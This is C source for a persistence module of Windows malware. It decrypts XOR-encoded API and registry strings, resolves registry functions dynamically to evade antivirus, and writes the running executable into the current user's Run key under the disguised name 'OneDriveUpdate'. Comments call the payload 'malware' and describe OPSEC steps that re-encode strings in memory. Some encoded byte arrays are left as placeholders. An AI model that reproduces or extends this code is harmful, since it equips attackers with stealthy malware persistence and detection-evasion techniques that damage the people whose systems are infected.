#include "config.h"
#include "persistence.h"
#include "evasion.h"
#include <string.h>

// used to cast generic API function pointer (FARPROC)
typedef LONG (WINAPI *pRegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
typedef LONG (WINAPI *pRegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef LONG (WINAPI *pRegCloseKey)(HKEY hKey);

bool install_persistence(const char* current_exe_path) {

    // TODO: check that Python script adds termination charatcter ('\0') to the strings

    char enc_advapi[] = { /* advapi32.dll\0 */ };
    char enc_OpenKey[] = { /* RegOpenKeyExA\0 */ };
    char enc_SetVal[] = { /* RegSetValueExA\0 */ };
    char enc_CloseKey[] = { /* RegCloseKey\0 */ };
    char enc_RunPath[] = { /* Software\Microsoft\Windows\CurrentVersion\Run\0 */ };
    char enc_ValName[] = { /* OneDriveUpdate\0 */ };

    // --- dynamic resolution

    pRegOpenKeyExA fnRegOpenKeyExA = (pRegOpenKeyExA) resolve_api(enc_advapi, sizeof(enc_advapi), enc_OpenKey, sizeof(enc_OpenKey), GLOBAL_KEY, GLOBAL_KEY_LEN);
    pRegSetValueExA fnRegSetValueExA = (pRegSetValueExA) resolve_api(enc_advapi, sizeof(enc_advapi), enc_SetVal, sizeof(enc_SetVal), GLOBAL_KEY, GLOBAL_KEY_LEN);
    pRegCloseKey fnRegCloseKey = (pRegCloseKey) resolve_api(enc_advapi, sizeof(enc_advapi), enc_CloseKey, sizeof(enc_CloseKey), GLOBAL_KEY, GLOBAL_KEY_LEN);

    // if AV blocks a function -> return
    if (!fnRegOpenKeyExA || !fnRegSetValueExA || !fnRegCloseKey) return FALSE;

    HKEY hKey;
    
    xor_crypt(enc_RunPath, sizeof(enc_RunPath), GLOBAL_KEY, GLOBAL_KEY_LEN);
    xor_crypt(enc_ValName, sizeof(enc_ValName), GLOBAL_KEY, GLOBAL_KEY_LEN);
    
    // open key to write registry
    LONG open_res = fnRegOpenKeyExA(HKEY_CURRENT_USER, enc_RunPath, 0, KEY_WRITE, &hKey);
    
    if (open_res == ERROR_SUCCESS) {
        // write malware path inside the autorun key
        fnRegSetValueExA(hKey, enc_ValName, 0, REG_SZ, (const BYTE*)current_exe_path, strlen(current_exe_path) + 1);
        
        // close registry handle
        fnRegCloseKey(hKey);
        
        // OPSEC: encode strings in RAM
        xor_crypt(enc_RunPath, sizeof(enc_RunPath), GLOBAL_KEY, GLOBAL_KEY_LEN);
        xor_crypt(enc_ValName, sizeof(enc_ValName), GLOBAL_KEY, GLOBAL_KEY_LEN);
        
        return true;
    }

    // OPSEC: encode also if failure occurs
    xor_crypt(enc_RunPath, sizeof(enc_RunPath), GLOBAL_KEY, GLOBAL_KEY_LEN);
    xor_crypt(enc_ValName, sizeof(enc_ValName), GLOBAL_KEY, GLOBAL_KEY_LEN);
    
    return false;
}